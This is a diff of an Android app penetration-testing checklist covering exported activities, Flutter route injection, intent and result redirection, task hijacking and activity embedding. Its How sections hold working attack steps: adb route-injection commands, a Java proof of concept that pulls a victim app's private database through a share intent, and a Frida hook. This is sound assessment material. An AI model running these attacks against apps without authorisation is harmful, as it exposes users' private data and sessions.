 | **Maps to** | Flutter `FlutterActivityLaunchConfigs.java` — `EXTRA_INITIAL_ROUTE = "route"`, `EXTRA_DART_ENTRYPOINT = "dart_entrypoint"`, `EXTRA_DART_ENTRYPOINT_ARGS = "dart_entrypoint_args"`, `EXTRA_CACHED_ENGINE_ID = "cached_engine_id"`, `EXTRA_CACHED_ENGINE_GROUP_ID`, `EXTRA_ENABLE_STATE_RESTORATION`; MASTG-TECH-0160 |
 
-- **Test:** `FlutterActivityLaunchConfigs.getInitialRoute()` checks `intent.hasExtra("route")` **first**,
-  before manifest metadata. Any exported `FlutterActivity` or subclass — including the default
-  `MainActivity` when it carries a `MAIN` or `BROWSABLE` filter — lets a third-party app choose the first
-  screen the Dart router renders. Separately, `deepLinkEnabled(metaData)` returns **true when
-  `flutter_deeplinking_enabled` is absent**, so a Flutter activity with a `VIEW`/`BROWSABLE` filter hands
-  the incoming URI straight to the Dart router with no Java-side allow-listing — which is why testers who
-  grep only for Java `getData()` handling wrongly close this surface.
-- **How:**
-  ```bash
-  grep -B5 -A15 'io.flutter.embedding.android.FlutterActivity' out/AndroidManifest.xml
-  grep -n 'flutter_deeplinking_enabled' out/AndroidManifest.xml || echo "ABSENT -> deep linking is ENABLED"
-  # harvest real route names from the Dart snapshot before guessing
-  grep -aoE '"/[a-zA-Z0-9_/-]+"' out_dir/pp.txt | sort -u | head -50
-  adb shell am start -n com.target.app/com.target.app.MainActivity -e route "/settings/developer"
-  adb shell am start -n com.target.app/com.target.app.MainActivity -e route "/account/transfer?to=attacker"
-  adb shell am start -n com.target.app/com.target.app.MainActivity -e dart_entrypoint "debugMain"
-  adb shell am start -n com.target.app/com.target.app.MainActivity --esa dart_entrypoint_args "--verbose"
-  ```
-- **Proof:** A screenshot of the target route rendering without passing the login or PIN gate, issued from
-  a zero-permission PoC. For the deep-link half, the URI path appearing as the rendered Dart route with no
-  validation in the decompiled `MainActivity`.
-- **Escalation:** Route injection plus a route that trusts its query parameters is a one-click state change;
-  pair with D09 to reach the same route from a browser link, and with D04-006 because the absence of
-  `enforceIntentFilter` is what lets a local app supply an *arbitrary* URI to the same activity.
-- **Ruled out when:** The Flutter activities are `exported="false"` and the single exported shell validates
-  the URI in Java against a host/path allow-list before handing it to Dart, **and**
-  `flutter_deeplinking_enabled` is explicitly `false` where deep linking is not wanted. Verify by sending a
-  route name outside the app's own table and observing the router refuse it rather than render a blank page.
-
+- **Test:** Covered by D19-042 (the `route` / `dart_entrypoint` extras) and D19-041 (`flutter_deeplinking_enabled` absent = ON); this row keeps the sweep honest. Activity-side input only: an exported `FlutterActivity` or subclass — including the default `MainActivity` when it carries a `MAIN` or `BROWSABLE` filter — is the entry both items drive; D04-006 is why a local app can hand it an *arbitrary* URI.
+- **How:** see D19-042 (the `route` / `dart_entrypoint` extras) and D19-041 (`flutter_deeplinking_enabled` absent = ON) — run it once there; record the activity-side fact in `inventory/components.csv` notes and the `D04-018` row as `covered-by D19-042`.
+- **Proof:** as D19-042 (the `route` / `dart_entrypoint` extras) and D19-041 (`flutter_deeplinking_enabled` absent = ON).
+- **Escalation:** -> D19-042 / D19-041; pair with D09 to reach the same route from a browser link, and with D04-006.
+- **Ruled out when:** as D19-042 (the `route` / `dart_entrypoint` extras) and D19-041 (`flutter_deeplinking_enabled` absent = ON) — the mechanism and the controlled experiment live there; this row closes when that row closes.
 ### D04-019 · Exported start activity destroys the authenticated session
 
 | | |
@@ -810,10 +858,9 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   silent … persistent … no special permissions required".
 - **How:**
   ```bash
-  grep -nE 'launchMode="singleInstance"' out/AndroidManifest.xml
+  grep -nE 'launchMode="singleInstance"' $DEC/apktool/AndroidManifest.xml
   # while the app is open and logged in:
-  adb shell am start -n com.basecamp.bc3/com.basecamp.bc4.app.main.start.StartActivity \
-    --es launchDataUri "https://app.basecamp.com/6217076/projects/47432622"
+  adb shell 'am start -n com.target.app/.StartActivity --es launchDataUri "https://app.target.example/1/projects/2"'
   # persistence:
   while true; do adb shell am start -n com.target.app/.StartActivity --es launchDataUri "https://…"; sleep 30; done
   ```
@@ -843,16 +890,16 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   ```java
   StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder().build());  // defeat FileUriExposedException
   Intent intent = new Intent("android.intent.action.SEND");
-  intent.setClassName("com.owncloud.android",
-      "com.owncloud.android.ui.activity.ReceiveExternalFilesActivity");
+  intent.setClassName("com.target.app",
+      "com.target.app.ui.activity.ReceiveExternalFilesActivity");   // the disclosed shape: a sync client's share-receive activity
   intent.setType("*/*");
   intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
   intent.putExtra("android.intent.extra.STREAM",
-      Uri.parse("file:///data/user/0/com.owncloud.android/databases/filelist"));
+      Uri.parse("file:///data/user/0/com.target.app/databases/filelist"));
   startActivity(intent);
   ```
   ```bash
-  grep -rnE 'EXTRA_STREAM|getParcelableExtra\(|getParcelableArrayListExtra\(' out/sources/ \
+  grep -rnE 'EXTRA_STREAM|getParcelableExtra\(|getParcelableArrayListExtra\(' $DEC/jadx/sources/ \
     | grep -nE 'openInputStream|FileInputStream|copy'
   ```
 - **Proof:** The victim app's private database appearing in the destination the share flow writes to. Name
@@ -882,8 +929,8 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   victim's identity behind it.
 - **How:**
   ```bash
-  grep -nB4 -A4 'requireContentUriPermissionFromCaller' out/AndroidManifest.xml
-  grep -rnE 'getData\(\)|EXTRA_STREAM|getClipData\(\)' out/sources/ | grep -iE 'openInputStream|openFileDescriptor'
+  grep -nB4 -A4 'requireContentUriPermissionFromCaller' $DEC/apktool/AndroidManifest.xml
+  grep -rnE 'getData\(\)|EXTRA_STREAM|getClipData\(\)' $DEC/jadx/sources/ | grep -iE 'openInputStream|openFileDescriptor'
   adb shell am start -n com.target.app/.ShareReceiverActivity \
     -a android.intent.action.SEND -t 'text/plain' \
     --eu android.intent.extra.STREAM \
@@ -915,7 +962,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   return channel.
 - **How:**
   ```bash
-  grep -rn 'setResult(' out/sources/ -A4 | grep -nE 'putExtra|getExtras'
+  grep -rn 'setResult(' $DEC/jadx/sources/ -A4 | grep -nE 'putExtra|getExtras'
   ```
   From the zero-permission PoC:
   ```java
@@ -949,12 +996,20 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 - **Test:** A one-line pattern with disproportionate impact. The activity hands you back an Intent whose
   grant flags the framework then honours **on your behalf**. Oversecured's rule: "if it does have access
   rights, then the same rights are transferred to the app to which the Intent is passed." Oversecured chained
-  exactly this in TikTok up to arbitrary code execution.
+  exactly this in TikTok up to arbitrary code execution. Two shapes: the self-echo
+  `setResult(RESULT_OK, getIntent())`, and the **relay** — the activity starts a picker or sub-activity for
+  result and returns that Intent verbatim (`onActivityResult(..., Intent data) { setResult(resultCode, data);
+  finish(); }`). In the relay the grant flags belong to the sub-activity's UID, which is usually the victim's
+  own provider — just as exploitable, and invisible to the self-echo grep. (D08-033 is the same primitive
+  seen from the redirection side; this item owns it.)
 - **How:**
   ```bash
-  grep -rn 'setResult(-1, getIntent())\|setResult(.*, *getIntent())' out/sources/
-  grep -rn 'setResult(' out/sources/ -A2 | grep -n 'getIntent()'
-  grep -rnE 'FLAG_GRANT_(READ|WRITE|PERSISTABLE|PREFIX)_URI_PERMISSION' out/sources/
+  grep -rn 'setResult(-1, getIntent())\|setResult(.*, *getIntent())' $DEC/jadx/sources/
+  grep -rn 'setResult(' $DEC/jadx/sources/ -A2 | grep -n 'getIntent()'
+  # relay variant: the activity forwards a sub-activity's result (and its grant flags) to whoever started it
+  grep -rn -A6 'onActivityResult' $DEC/jadx/sources/ | grep -nE 'setResult\([^,)]+, *[a-z][A-Za-z0-9_]*\)'
+  grep -rnE 'registerForActivityResult' $DEC/jadx/sources/ -A8 | grep -nE 'setResult\('
+  grep -rnE 'FLAG_GRANT_(READ|WRITE|PERSISTABLE|PREFIX)_URI_PERMISSION' $DEC/jadx/sources/
   ```
   From the attacker activity:
   ```java
@@ -992,9 +1047,9 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   malicious activity registered for the same action returns a forged result and the victim consumes it.
 - **How:**
   ```bash
-  grep -rnE 'startActivityForResult\(|registerForActivityResult\(' out/sources/ -A3 \
+  grep -rnE 'startActivityForResult\(|registerForActivityResult\(' $DEC/jadx/sources/ -A3 \
     | grep -nE 'ACTION_PICK|ACTION_GET_CONTENT|ACTION_IMAGE_CAPTURE|new Intent\("'
-  grep -rn 'onActivityResult' out/sources/ -A25 \
+  grep -rn 'onActivityResult' $DEC/jadx/sources/ -A25 \
     | grep -nE 'getStringExtra|getData\(\)|RESULT_OK|== *-1'
   # discover every app that will answer the same implicit intent
   dz> run app.activity.forintent --action android.intent.action.PICK --data content://x
@@ -1034,7 +1089,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   sensitive result is not the component the developer assumed.
 - **How:**
   ```bash
-  grep -rn 'FLAG_ACTIVITY_FORWARD_RESULT\|0x02000000' out/sources/
+  grep -rn 'FLAG_ACTIVITY_FORWARD_RESULT\|0x02000000' $DEC/jadx/sources/
   adb shell am start -n com.target.app/.ResultActivity -f 0x02000000
   ```
   ```
@@ -1064,25 +1119,33 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 - **Test:** Treating a non-null `getCallingActivity()` as proof of a trusted caller. It is populated only for
   `startActivityForResult()`, it is attacker-controlled in content, and an attacker can make it null at will
   by using `startActivity()` instead. Either branch may be the privileged one — test both.
+  `getLaunchedFromUid()`/`getLaunchedFromPackage()` (API 34) are system-populated and trustworthy **when
+  present**, but are `-1`/`null` unless the caller opted in with `setShareIdentityEnabled(true)` — so an
+  attacker chooses the absent branch. `getReferrer()` honours the caller-supplied `EXTRA_REFERRER`.
 - **How:**
   ```bash
-  grep -rn 'getCallingActivity\|getCallingPackage' out/sources/ -A8
+  grep -rnE 'getCallingActivity|getCallingPackage|getLaunchedFromUid|getLaunchedFromPackage|getReferrer\(|EXTRA_REFERRER|getCurrentCaller|getInitialCaller|ComponentCaller' $DEC/jadx/sources/ -A8
   ```
-  From the PoC, invoke both ways and log which branch ran:
+  From the PoC, invoke three ways and log which branch ran:
   ```java
-  startActivity(i);                 // getCallingActivity() == null
+  startActivity(i);                 // getCallingActivity() == null; getLaunchedFromUid() == -1
   startActivityForResult(i, 1);     // getCallingActivity() == your component
+  startActivity(i, ActivityOptions.makeBasic().setShareIdentityEnabled(true).toBundle());   // API 34: getLaunchedFromUid()/Package() populated — the attacker CHOOSES whether they are
   ```
   Hook the branch to see it directly:
   ```bash
-  frida -D "$SERIAL" -n com.target.app -e 'Java.perform(function(){var A=Java.use("com.target.app.GateActivity");A.isTrustedCaller.implementation=function(){var r=this.isTrustedCaller();console.log("isTrustedCaller -> "+r);return r;};});'
+  frida -D "$SERIAL" -n com.target.app -q -t 30 -e 'Java.perform(function(){var A=Java.use("com.target.app.GateActivity");A.isTrustedCaller.implementation=function(){var r=this.isTrustedCaller();console.log("isTrustedCaller -> "+r);return r;};});'
   ```
-- **Proof:** The privileged branch executing under one of the two invocation styles from an untrusted
+  `-D <serial>` from `adb devices`; `-q -t <seconds>` keeps the non-interactive session alive for that long —
+  without `-t` the script detaches immediately after load and every hook shows zero hits.
+- **Proof:** The privileged branch executing under one of the three invocation styles from an untrusted
   package, with the branch logged.
 - **Escalation:** -> D13/D15 auth bypass. The correct construction, worth naming in the remediation, is
   `Binder.getCallingUid()` inside a Service or ContentProvider (D06/D07) followed by
-  `PackageManager.getPackagesForUid()` **plus a signature check** — an activity simply cannot obtain a
-  trustworthy caller identity before API 35's `ComponentCaller`.
+  `PackageManager.getPackagesForUid()` **plus a signature check**; on API 34+ an activity may use
+  `getLaunchedFromUid()` compared against a signature-checked allow-list **and refuse when it is `-1`**; on
+  35+ `ComponentCaller.getUid()`/`checkContentUriPermission` in both `onCreate` and `onNewIntent` (D04-029).
+  Below 34 an activity simply cannot obtain a trustworthy caller identity.
 - **Ruled out when:** The activity performs no caller-identity check at all and instead relies on a
   `signature`-level `android:permission` (a real control), or it uses `ComponentCaller`/`getCallingPackage()`
   only for telemetry with no branch depending on it — verified by invoking both ways and observing identical
@@ -1105,11 +1168,11 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   `enforceCallingOrSelfPermission()`.
 - **How:**
   ```bash
-  grep -rn -B2 -A4 'checkCallingPermission\|checkCallingOrSelfPermission' out/sources/
+  grep -rn -B2 -A4 'checkCallingPermission\|checkCallingOrSelfPermission' $DEC/jadx/sources/
   # the smoking gun: the call on its own statement line
-  grep -rnE 'checkCalling(OrSelf)?Permission\([^)]*\)\s*;' out/sources/
+  grep -rnE 'checkCalling(OrSelf)?Permission\([^)]*\)\s*;' $DEC/jadx/sources/
   # and the guards that *should* be there
-  grep -rnE 'enforceCallingPermission|enforceCallingOrSelfPermission' out/sources/
+  grep -rnE 'enforceCallingPermission|enforceCallingOrSelfPermission' $DEC/jadx/sources/
   ```
 - **Proof:** A decompiled statement `checkCallingPermission("com.target.PRIVILEGED");` on its own line,
   followed by the privileged action executing unconditionally — then the action demonstrated from a stub app
@@ -1137,8 +1200,8 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   authenticated screen with new parameters — a BOLA in UI form.
 - **How:**
   ```bash
-  grep -nE 'launchMode="(singleTask|singleTop|singleInstance|singleInstancePerTask)"' out/AndroidManifest.xml
-  grep -rn 'onNewIntent' out/sources/ -A25
+  grep -nE 'launchMode="(singleTask|singleTop|singleInstance|singleInstancePerTask)"' $DEC/apktool/AndroidManifest.xml
+  grep -rn 'onNewIntent' $DEC/jadx/sources/ -A25
   # drive it twice: first legitimately, then hostile
   adb shell am start -n com.target.app/.OrderActivity --el orderId 100001
   adb shell am start -n com.target.app/.OrderActivity --el orderId 999999 --ez isAdmin true
@@ -1167,7 +1230,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   package is unchecked — and checking `getCallingActivity()` for non-null instead (D04-026).
 - **How:**
   ```bash
-  grep -rnE 'ComponentCaller|getCurrentCaller|getInitialCaller|checkContentUriPermissionFull|onNewIntent' out/sources/
+  grep -rnE 'ComponentCaller|getCurrentCaller|getInitialCaller|checkContentUriPermissionFull|onNewIntent' $DEC/jadx/sources/
   ```
   Deliver the first intent from package A (or the app's own flow) and the second from package B, then watch
   the privileged action run:
@@ -1202,7 +1265,8 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 - **How:**
   ```bash
   adb shell am start -n com.target.app/.Target -f 0x10000000     # NEW_TASK
-  adb shell am start -n com.target.app/.Target -f 0x10008000     # NEW_TASK|CLEAR_TOP
+  adb shell am start -n com.target.app/.Target -f 0x14000000     # NEW_TASK|CLEAR_TOP
+  adb shell am start -n com.target.app/.Target -f 0x10008000     # NEW_TASK|CLEAR_TASK — the destructive control: the task should be wiped, confirming the flag reaches the stack
   adb shell am start -n com.target.app/.Target -f 0x18000000     # NEW_TASK|MULTIPLE_TASK
   adb shell dumpsys activity activities | sed -n '/Task{/,+8p'
   ```
@@ -1280,7 +1344,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 - **How:** Read the victim's exposure first, and read `minSdkVersion` before you spend any time here:
   ```bash
   aapt dump badging base.apk | grep -oE "(min|target)SdkVersion:'[0-9]+'"
-  grep -nE 'android:(taskAffinity|allowTaskReparenting|launchMode)' out/AndroidManifest.xml
+  grep -nE 'android:(taskAffinity|allowTaskReparenting|launchMode)' $DEC/apktool/AndroidManifest.xml
   apkanalyzer manifest print base.apk | grep -i taskaffinity
   ```
   Attacker manifest:
@@ -1329,11 +1393,11 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   top of that task and the user sees no app switch.
 - **How:**
   ```bash
-  grep -nE 'launchMode="single(Task|Instance)"' out/AndroidManifest.xml
+  grep -nE 'launchMode="single(Task|Instance)"' $DEC/apktool/AndroidManifest.xml
   aapt dump badging base.apk | grep targetSdkVersion
   python3 - <<'PY'
   import xml.dom.minidom as m
-  d = m.parse('out/AndroidManifest.xml'); NS='android'
+  d = m.parse('$DEC/apktool/AndroidManifest.xml'); NS='android'
   for a in d.getElementsByTagName('activity'):
       e  = a.getAttribute(f'{NS}:exported')
       lm = a.getAttribute(f'{NS}:launchMode')
@@ -1408,8 +1472,8 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   than the legacy one.
 - **How:**
   ```bash
-  grep -n 'allowCrossUidActivitySwitchFromBelow' out/AndroidManifest.xml   # expect false; absence = unhardened
-  grep -nE 'taskAffinity|launchMode="singleTask"|allowTaskReparenting' out/AndroidManifest.xml
+  grep -n 'allowCrossUidActivitySwitchFromBelow' $DEC/apktool/AndroidManifest.xml   # expect false; absence = unhardened
+  grep -nE 'taskAffinity|launchMode="singleTask"|allowTaskReparenting' $DEC/apktool/AndroidManifest.xml
   adb shell dumpsys activity activities | grep -A3 'Task{.*com.target.app'
   ```
   Then run the D04-032 attacker manifest against an Android 15 device.
@@ -1438,7 +1502,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   carved into its own defence; the ones that matter sit on authentication and payment screens.
 - **How:**
   ```bash
-  grep -rn 'setAllowCrossUidActivitySwitchFromBelow' out/sources/
+  grep -rn 'setAllowCrossUidActivitySwitchFromBelow' $DEC/jadx/sources/
   # cross-reference the call sites against the sensitive-screen list
   ```
 - **Proof:** The call present in an activity that also handles authentication, payment confirmation or
@@ -1448,35 +1512,42 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 - **Ruled out when:** No call site exists, or every call site is on a screen with no credential entry and no
   irreversible control — and the D04-035 reproduction fails there too.
 
-### D04-037 · `android:allowEmbedded` without `knownActivityEmbeddingCerts`
+### D04-037 · `android:allowUntrustedActivityEmbedding="true"` (or `allowEmbedded`) without `knownActivityEmbeddingCerts`
 
 | | |
 |---|---|
 | **Severity ceiling** | Medium |
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) |
 | **Attacker** | AM-03 |
-| **Applies to** | all; `android:allowEmbedded` defaults to `"false"` |
+| **Applies to** | API 33+ for `allowUntrustedActivityEmbedding` / `knownActivityEmbeddingCerts` (both default to closed); `android:allowEmbedded` defaults to `"false"` on every version |
 | **Requires** | api>=33 |
 | **Maps to** | `guide/topics/manifest/activity-element` (`allowEmbedded`, `knownActivityEmbeddingCerts`) |
 
-- **Test:** `android:allowEmbedded="true"` lets an activity be launched as an embedded child of another
-  activity — rendered inside a host app's window. On a sensitive activity with no
-  `android:knownActivityEmbeddingCerts` pinning the permitted host signature, an untrusted host embeds and
-  frames it, with whatever chrome it likes around the victim's screen.
+- **Test:** From API 33 an activity is embeddable by another app's split host only if it sets
+  `android:allowUntrustedActivityEmbedding="true"` or lists the host's signing certificate in
+  `android:knownActivityEmbeddingCerts`; the host opts in per launch with
+  `ActivityOptions.setLaunchActivityEmbedding` / Jetpack `SplitController`. An untrusted host then embeds and
+  frames the sensitive activity with whatever chrome it likes around the victim's screen. `allowEmbedded` is
+  the older host-embedding attribute (bubbles, `ActivityView`) and is covered by D04-040; D03-077 owns the
+  manifest audit of the attribute, this item owns the host-side PoC.
 - **How:**
   ```bash
-  grep -nE 'allowEmbedded|knownActivityEmbeddingCerts|resizeableActivity' out/AndroidManifest.xml
+  grep -nE 'allowUntrustedActivityEmbedding|knownActivityEmbeddingCerts|allowEmbedded' $DEC/apktool/AndroidManifest.xml
+  grep -rnE 'SplitController|ActivityEmbeddingController|setLaunchActivityEmbedding|isCrossActivityEmbedding|SplitPairRule' $DEC/jadx/sources/
   ```
-  Then embed it from a stub host and capture the composed UI.
-- **Proof:** A sensitive (auth/payment) activity declaring `android:allowEmbedded="true"` with no
-  `knownActivityEmbeddingCerts`, plus a screenshot of it rendering inside your host's window with your chrome
-  around it.
+  Then embed it from a differently-signed stub host (`androidx.window` `SplitPairRule` pairing the host's
+  activity with the target's) and capture the composed UI plus
+  `adb shell dumpsys activity activities | grep -iE 'TaskFragment|embedded'`.
+- **Proof:** A sensitive (auth/payment) activity declaring `android:allowUntrustedActivityEmbedding="true"`
+  (or `allowEmbedded="true"`) with no `knownActivityEmbeddingCerts`, plus the `dumpsys` TaskFragment line and
+  a screenshot of it rendering inside your host's window with your chrome around it.
 - **Escalation:** This is UI redress with a legitimate-looking frame, and it does not require
   `SYSTEM_ALERT_WINDOW` — so it survives the Android 12 overlay restrictions that kill D04-047. Chain to
   D13 credential capture.
-- **Ruled out when:** No activity sets `allowEmbedded="true"`, or every one that does also sets
-  `knownActivityEmbeddingCerts` pinning the first-party signing certificate — verified by attempting the
-  embed from a differently-signed host and observing it refused.
+- **Ruled out when:** No activity sets `allowUntrustedActivityEmbedding="true"` (or `allowEmbedded="true"`),
+  and every `knownActivityEmbeddingCerts` entry is a first-party certificate — verified by the
+  differently-signed host's embed attempt being refused (the activity opens full-screen in its own task
+  instead).
 
 ### D04-038 · Background-Activity-Launch is the make-or-break precondition — state it or the PoC is not reproducible
 
@@ -1494,23 +1565,32 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   victim is backgrounded and you get `BAL_BLOCK` with result code `102` and nothing happens. Half the
   "not reproducible" closes on this domain are this, not a broken bug.
 - **How:**
+  The shell UID is BAL-exempt and `$?` of `adb` is not the `am start` result: a chain fired from
+  `adb shell am start` can never produce the `BAL_BLOCK` this item asks for. Fire the trigger from the
+  zero-permission PoC (D04-005) with the attacker backgrounded, and read the verdict ActivityTaskManager
+  logs for *that* launch:
   ```bash
   adb logcat -c
-  # fire the chain, then:
-  adb logcat | grep -oE 'BAL_[A-Z_]+'
-  adb shell am start -n com.target.app/.Target ; echo "result=$?"
+  # the PoC's onCreate calls moveTaskToBack(true), then sprays the trigger (below); a tools gap: the shared probe
+  # has no background-first switch yet, so add the call to a probe build or to the D04-005 stub
+  adb shell am start -S -W -n com.poc.zeroperm/.MainActivity
+  adb logcat -d -s ActivityTaskManager | grep -oE 'BAL_[A-Z_]+|balAllowedByPiSender=[a-zA-Z_]+|resultIfPiSenderAllowsBal=[a-zA-Z_]+|realCallerStartMode=[A-Z_]+'
+  # LEGACY model without an old image (userdebug/AVD only): restore API<=33 PendingIntent-sender / creator semantics for one victim
+  adb shell 'am compat disable 244637991 com.target.app'   # DEFAULT_RESCIND_BAL_PRIVILEGES_FROM_PENDING_INTENT_SENDER
+  adb shell 'am compat disable 296478951 com.target.app'   # creator rule (API 35)
   ```
   The working shape observed in the field: the attacker's `onCreate` calls `moveTaskToBack(true)` at roughly
   400 ms **and** sprays the trigger about twenty times over ~24 s so one lands while the victim is visible.
   `moveTaskToBack` returns to the task *behind* the attacker, so the attacker must be opened **over the
   victim's screen** — launching it from the launcher puts the launcher behind, the victim stays hidden, and
   you get `BAL_BLOCK` every time.
-  Also grep the target for the opt-back-in:
-  ```bash
-  grep -rnE 'setPendingIntentBackgroundActivityStartMode|MODE_BACKGROUND_ACTIVITY_START_ALLOWED|BIND_ALLOW_ACTIVITY_STARTS|setPendingIntentCreatorBackgroundActivityStartMode' out/sources/
-  ```
-- **Proof:** `BAL_ALLOW_VISIBLE_WINDOW` in logcat alongside the redirected activity appearing, contrasted
-  with `BAL_BLOCK` / `result code=102` when the attacker is foreground. Both captures belong in the report.
+  The opt-in audit (sender opt-in at 34, creator opt-in at 35, `BIND_ALLOW_ACTIVITY_STARTS`) is owned by
+  D22-045 — run it there and cite the result; this item is the gate that makes every BAL-dependent PoC in
+  this chapter state its precondition.
+- **Proof:** The ActivityTaskManager verdict line for the **probe's** launch — `BAL_ALLOW_VISIBLE_WINDOW`
+  (with its `realCallerStartMode` field) alongside the redirected activity appearing, contrasted with
+  `BAL_BLOCK` / `result code=102` when the attacker is foreground. Both captures belong in the report; a
+  verdict captured from an `adb shell am start` is not one of them.
 - **Escalation:** Frame the exploit as "captures on the victim's next login" — a recurring natural event —
   never as "works unconditionally". A target that calls
   `ActivityOptions.setPendingIntentBackgroundActivityStartMode(MODE_BACKGROUND_ACTIVITY_START_ALLOWED)` on a
@@ -1528,7 +1608,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **Severity ceiling** | High |
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_authentication_and_session_management.authentication_bypass` (P1) if the reached screen is post-auth |
 | **Attacker** | AM-03 |
-| **Applies to** | all; mitigated for *implicit* intents at targetSdk 34+, but nested-**explicit** redirection is unaffected |
+| **Applies to** | all; implicit redirection mitigated at targetSdk 34+; on **Android 16 devices** nested-explicit redirection is blocked by launch-security protection (an Intent unparcelled from another app's Intent may not start a non-exported component) unless the deputy or the forwarding activity calls `removeLaunchSecurityProtection()` — below API 36, or where that call exists, it is live |
 | **Requires** | device |
 | **Maps to** | Oversecured, "Discovering vendor-specific vulnerabilities in Android" — the `com.android.settings.homepage.SettingsHomepageActivity` case, "since Settings runs with UID 1000 (system), this escalated to accessing non-exported activities across all apps on the device"; AOSP threat classes [T.A2] and [T.A7] |
 
@@ -1540,7 +1620,10 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   ```bash
   adb shell dumpsys package com.android.settings | grep -E 'exported=true' | head -40
   # jadx on the deputy: nested-Intent extraction into startActivity
-  grep -rnE 'getParcelableExtra\([^)]*\)\s*;?\s*$|startActivity\(\s*\(Intent\)' deputy_src/
+  adb pull "$(adb shell pm path <deputy> | sed 's/package://' | head -1)" "$E/apk/deputy.apk" && jadx -d "$DEC/deputies/<deputy>" "$E/apk/deputy.apk"
+  grep -rnE 'getParcelableExtra\([^)]*\)\s*;?\s*$|startActivity\(\s*\(Intent\)' $DEC/deputies/<deputy>/sources/
+  grep -rnE 'removeLaunchSecurityProtection|setLaunchSecurityProtection' $DEC/jadx/sources/ $DEC/deputies/*/sources/ 2>/dev/null   # the opt-out: each call site re-opens the deputy on API 36
+  adb logcat -d | grep -iE 'launch.?security|protected intent|LaunchSecurity'   # the refusal line on API 36 when the nested intent is blocked
   adb shell am start -n com.oem.settings/.homepage.SettingsHomepageActivity \
     -e ':android:show_fragment' com.target.app.InternalFragment
   ```
@@ -1555,12 +1638,15 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 - **Proof:** The non-exported activity visibly starting, named by
   `adb shell dumpsys activity activities | grep -A3 mResumedActivity`, while a direct
   `am start -n com.target.app/.internal.NonExportedActivity` from the same context returns
-  `java.lang.SecurityException: Permission Denial: ... not exported from uid ...`. That contrast — direct
-  start denied, deputy-mediated start succeeded — is the whole finding.
+  `java.lang.SecurityException: Permission Denial: ... not exported from uid ...` (with `adb shell id`
+  showing uid 2000 — a uid-0 shell starts non-exported activities directly and voids the contrast). That
+  contrast — direct start denied, deputy-mediated start succeeded — is the whole finding.
 - **Escalation:** Non-exported activities skip auth precisely because they assume an internal caller, so the
   reached screen is usually a D04-007 or a D04-013 -> D15. Critical when the deputy runs as UID 1000, because
   the started component inherits system-side effects.
-- **Ruled out when:** No deputy on the device forwards a caller-supplied Intent (verified by reading the
+- **Ruled out when:** On API 36 with no `removeLaunchSecurityProtection` call anywhere in the deputy and the
+  target, the nested-explicit path is platform-blocked — record the logcat refusal as the mechanism; on API
+  <= 35 fall through: no deputy on the device forwards a caller-supplied Intent (verified by reading the
   candidate deputies' handlers, not by a scanner), **and** the target's non-exported activities refuse to run
   without the session state the normal flow establishes. On a stock Google device with no OEM Settings fork,
   record that the deputy set was empty — that is scoped, not universal.
@@ -1573,6 +1659,7 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null); `broken_access_control.idor.view_sensitive_information_iterable_object_identifiers` (P3) if it renders another user's conversation |
 | **Attacker** | AM-03 |
 | **Applies to** | API 29+ for bubbles; API 30+ requires a long-lived sharing shortcut |
+| **Requires** | — |
 | **Maps to** | `develop/ui/views/notifications/bubbles` — `NotificationCompat.BubbleMetadata.Builder`, `setAutoExpandBubble(true)`, `setSuppressNotification(true)`, `setShortcutId()`, `android:allowEmbedded="true"`, `android:resizeableActivity="true"`, `android:documentLaunchMode="always"`, and "Bubbles float on top of other app content" |
 
 - **Test:** Chat and support features that implement Android Bubbles must declare the bubble target with
@@ -1582,8 +1669,8 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   session?
 - **How:**
   ```bash
-  grep -nE 'allowEmbedded="true"' out/AndroidManifest.xml
-  grep -rnE 'BubbleMetadata|setBubbleMetadata|setAutoExpandBubble|setSuppressNotification|setShortcutId' out/sources/
+  grep -nE 'allowEmbedded="true"' $DEC/apktool/AndroidManifest.xml
+  grep -rnE 'BubbleMetadata|setBubbleMetadata|setAutoExpandBubble|setSuppressNotification|setShortcutId' $DEC/jadx/sources/
   adb shell am start -n com.target.app/.bubbles.BubbleActivity --es conversationId 'victim-thread-id'
   adb shell am force-stop com.target.app && \
     adb shell am start -n com.target.app/.bubbles.BubbleActivity --es conversationId X
@@ -1615,8 +1702,8 @@ Exact note text for the partial case (write it once in `engagement.json.domains_
   multiplies the Recents disclosure surface by the number of documents the user opened.
 - **How:**
   ```bash
-  grep -nE 'documentLaunchMode|excludeFromRecents|autoRemoveFromRecents|noHistory' out/AndroidManifest.xml
-  grep -rnE 'FLAG_ACTIVITY_NEW_DOCUMENT|FLAG_ACTIVITY_RETAIN_IN_RECENTS|setTaskDescription' out/sources/
+  grep -nE 'documentLaunchMode|excludeFromRecents|autoRemoveFromRecents|noHistory' $DEC/apktool/AndroidManifest.xml
+  grep -rnE 'FLAG_ACTIVITY_NEW_DOCUMENT|FLAG_ACTIVITY_RETAIN_IN_RECENTS|setTaskDescription' $DEC/jadx/sources/
   # open three sensitive documents, then:
   adb shell input keyevent KEYCODE_APP_SWITCH && adb exec-out screencap -p > recents.png
